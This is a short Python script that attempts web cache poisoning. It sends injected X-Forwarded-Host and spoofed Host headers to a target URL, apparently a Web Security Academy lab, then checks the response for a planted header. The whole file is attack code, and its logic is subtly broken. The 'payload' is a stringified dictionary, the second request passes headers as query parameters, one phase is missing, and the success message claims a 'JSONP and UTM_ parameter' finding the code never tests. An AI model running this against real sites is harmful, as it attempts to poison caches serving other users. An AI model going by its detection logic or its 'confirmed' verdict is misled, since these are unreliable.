import requests
from list import *


# Phase 1: Identify the vulnerable application
# vulnerable_url = "https://0a8c000004f2a93e852b90f500200020.web-security-academy.net/"

def jsonp(vulnerable_url , header):

   # Phase 2: Create a malicious JSON payload
   malicious_payload = {
      "cache-control": "max-age=31536000",
      "pragma": "no-cache",
      "expires": "Wed, 21-Jan-2026 07:28:00 GMT",
      "content-type": "application/json",
      "x-foo": "bar"
   }

   headersjson = {
      "X-Forwarded-Host": str(malicious_payload),
      "Host": "vulnerable-app.com"
   }
   
   update_header = {**header , **headersjson}
   response = requests.get(vulnerable_url, headers=update_header)

   if response.status_code == 200:
      print(f"Payload injected successfully{vulnerable_url}")
   else:
      print(f"Failed to inject payload, status code: {response.status_code}")

   # Phase 4: Verify the cache poisoning
   response = requests.get(vulnerable_url,header)

   # Check if the malicious payload is present in the response headers
   if "x-foo" in response.headers and response.headers["x-foo"] == "bar":
      print("Web Cache Poisoning via JSONP and UTM_ parameter is confirmed!")
      my_list.append("Web Cache Poisoning via JSONP and UTM_ parameter is confirmed!")
      print("Response headers:")
      for key, value in response.headers.items():
         print(f"{key}: {value}")


